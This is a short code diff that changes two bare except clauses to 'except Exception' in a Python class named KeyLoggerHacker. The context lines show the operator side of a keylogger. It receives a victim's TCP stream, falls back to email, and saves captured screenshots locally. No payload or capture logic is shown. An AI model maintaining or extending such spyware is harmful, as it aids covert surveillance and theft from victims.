@@ -100,7 +100,7 @@ class KeyLoggerHacker(threading.Thread):
 					self.logger.info("Connection closed!\n")
 					break
 
-			except:
+			except Exception:
 				self.connection.socket_stream.close()
 				self.connection.socket_interact.close()
 				self.logger.info("\nClient closed the TCP connection.\nFrom now on communication will be via email if the process was not killed.\n")
@@ -143,6 +143,6 @@ class KeyLoggerHacker(threading.Thread):
 								self.logger.info('Moving the screenshot into current folder...')
 								shutil.move(os.path.join(self.temp_path, "screenshot.png"), f"./screenshot_{date_time}.png")
 								self.logger.info('Done\n')
-			except:
+			except Exception:
 				self.logger.info("Something went wrong while processing the email!")
 				break
